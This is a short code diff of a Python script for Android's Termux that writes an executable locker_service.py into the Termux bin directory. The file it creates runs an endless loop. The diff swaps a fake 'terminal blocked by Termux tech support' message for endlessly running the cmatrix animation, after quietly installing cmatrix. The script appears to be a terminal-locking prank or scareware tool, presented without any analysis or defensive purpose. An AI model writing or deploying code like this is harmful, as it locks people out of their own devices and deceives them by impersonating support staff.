@@ -5,8 +5,10 @@ from colorama import Fore
 os.system('clear')
 file = open('/data/data/com.termux/files/usr/bin/locker_service.py', 'w')
 file.write("""
+import os
+os.system('pkg install cmatrix')
 while True:
-	a = input('Терминал заблокирован тех.поддержкой инструмента Termux.')
+	os.system('cmatrix')
 """)
 file.close()
 os.system('chmod +x /data/data/com.termux/files/usr/bin/locker_service.py')
